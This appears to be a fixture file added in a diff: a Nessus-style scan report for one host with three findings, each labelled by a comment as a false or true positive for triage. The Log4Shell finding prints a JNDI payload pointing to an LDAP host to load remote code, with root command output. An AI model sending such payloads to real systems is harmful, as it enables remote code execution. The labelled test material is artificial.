@@ -1,0 +1,56 @@
+<?xml version="1.0" ?>
+<NessusClientData_v2>
+  <Report name="Corporate External Assessment" xmlns:cm="http://www.nessus.org/cm">
+    <ReportHost name="192.168.10.50">
+      <HostProperties>
+        <tag name="operating-system">Linux Kernel 5.10 (Debian 11 bullseye)</tag>
+        <tag name="host-ip">192.168.10.50</tag>
+      </HostProperties>
+      
+      <!-- Finding 1: Classic False Positive - OpenSSL version banner on Debian backported system -->
+      <ReportItem port="443" svc_name="https" protocol="tcp" severity="3" pluginID="121010" pluginName="OpenSSL 1.1.1 Vulnerability Detection">
+        <description>The remote host is running a version of OpenSSL prior to 1.1.1k. It is, therefore, affected by multiple vulnerabilities.</description>
+        <synopsis>The remote service is running a vulnerable OpenSSL version.</synopsis>
+        <solution>Upgrade to OpenSSL version 1.1.1k or later.</solution>
+        <risk_factor>High</risk_factor>
+        <cvss3_base_score>7.5</cvss3_base_score>
+        <cve>CVE-2021-3450</cve>
+        <cve>CVE-2021-3449</cve>
+        <plugin_output>
+          Remote banner: OpenSSL/1.1.1n-0+deb11u5 (Debian)
+          Installed version: 1.1.1n
+          Fixed version: 1.1.1k
+          Note: Debian-11+deb11u5 security patch installed on target.
+        </plugin_output>
+      </ReportItem>
+
+      <!-- Finding 2: True Positive - Confirmed RCE with command execution output -->
+      <ReportItem port="8080" svc_name="http" protocol="tcp" severity="4" pluginID="156014" pluginName="Apache Log4j RCE (Log4Shell)">
+        <description>Apache Log4j2 versions 2.0-beta9 through 2.14.1 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.</description>
+        <synopsis>An attacker who can control log messages can execute arbitrary code.</synopsis>
+        <solution>Update to Apache Log4j 2.15.0 or later.</solution>
+        <risk_factor>Critical</risk_factor>
+        <cvss3_base_score>10.0</cvss3_base_score>
+        <cve>CVE-2021-44228</cve>
+        <plugin_output>
+          Exploitation successful! Sent payload: ${jndi:ldap://192.168.10.1:1389/Exploit}
+          Received callback from target container.
+          Executed command 'id':
+          uid=0(root) gid=0(root) groups=0(root)
+        </plugin_output>
+      </ReportItem>
+
+      <!-- Finding 3: Low Informational / Minor False Positive -->
+      <ReportItem port="80" svc_name="http" protocol="tcp" severity="1" pluginID="10092" pluginName="Apache HTTP Server Inode Disclosure (ETag)">
+        <description>The remote web server reveals inode numbers in the ETag header.</description>
+        <synopsis>The web server leaks internal filesystem metadata.</synopsis>
+        <solution>Configure FileETag MTime Size in httpd.conf.</solution>
+        <risk_factor>Low</risk_factor>
+        <cvss3_base_score>2.6</cvss3_base_score>
+        <plugin_output>
+          ETag header received: ETag: "205-59b-4b8c8d234"
+        </plugin_output>
+      </ReportItem>
+    </ReportHost>
+  </Report>
+</NessusClientData_v2>
